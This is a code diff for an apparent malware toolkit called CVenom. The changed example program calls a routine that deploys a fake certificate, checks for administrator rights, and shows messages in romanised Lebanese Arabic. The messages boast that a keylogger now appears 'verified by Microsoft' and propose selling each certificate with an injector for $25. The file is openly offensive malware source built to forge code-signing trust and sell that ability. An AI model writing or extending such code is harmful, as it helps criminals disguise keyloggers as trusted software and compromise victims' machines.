@@ -1,20 +1,25 @@
-#include "../CVenom.h"
-#include "../RuntimeTools.h"
+#include <CVenom.h>
+#include <DominationTools.h>
+#include <UITools.h>
 
-
-THREAD_ENTRY Fuck(THREAD){
-	printf("Emak A7be A7be");
-	system("thunar");
-}
 
 int main(MALWARE_ENTRY){
 	cvinit(MALWARE_INIT);
 
-	RuntimeTools	Runner;
+	DominationTools	Dom;
+	UITools	Ui;
 
-	Runner.DetachThread(Fuck);
+	Dom.DeployFakeCertificate();
 
-	printf("5ara\n");
+
+	if (Current.privileges == ADMIN){
+		Ui.InformateUser("Great", "Shefet Verified by microsoft :), keylogger l 7nbi3o verified by microsoft");
+		Ui.AskUser("Shou Ra2yak?", "na3mel Certificates wnbi3a ma3 l Injector ? kl Cert b $25 !?");
+		cvexit(0);
+	}
+
+
+	Ui.InformateUser("Great", "hala2 kbos run as administrator w shouf eno verified w rja3 kbos cancel");
 
 	cvexit(MALWARE_EXIT);
 }
